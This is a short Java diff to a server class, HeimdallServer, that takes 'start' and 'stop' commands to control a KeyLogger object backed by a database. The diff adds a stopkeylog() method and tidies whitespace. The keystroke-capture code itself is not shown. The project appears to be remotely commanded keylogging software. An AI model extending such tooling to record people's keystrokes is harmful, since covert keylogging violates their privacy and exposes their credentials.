@@ -249,12 +249,10 @@ public class HeimdallServer extends AbstractVerticle {
 		
 	}
 
-	
 	private ParserResponse start_keylog(){
 		ParserResponse response = new ParserResponse();
 		if(keylogger==null){
 			keylogger = new KeyLogger(config.getDb_config(),this.vertx);
-			
 		}
 		response.setResult(keylogger.start());
 		
@@ -329,10 +327,10 @@ public class HeimdallServer extends AbstractVerticle {
 		String command = iterator.next();
 		System.out.println("Command :-> " + command);
 		switch(command){
-		case "stop":   response = stop_();break;
+		case "stop":   response = stopkeylog(); break;
 		
 		case "start":{
-					   response=start_keylog();
+					   response=  start_keylog();
 					   
 					   
 					 }break;
@@ -345,6 +343,24 @@ public class HeimdallServer extends AbstractVerticle {
 			response.setComments("Unkown command.. Please check the valid sintaxis");
 			};
 		}return response;
+	}
+
+	private ParserResponse stopkeylog() {
+		// TODO Auto-generated method stub
+		
+		ParserResponse response = new ParserResponse();
+		if(keylogger!=null)
+			if(keylogger.isRunning()){
+				keylogger.stop();
+				response.setResult(true);
+				response.setComments("Stoped keylog");
+			}
+			else{
+				response.setResult(false);
+				response.setComments("Not running yet");
+			};
+		
+		return response;
 	}
 
 	private ParserResponse parse(String string) {
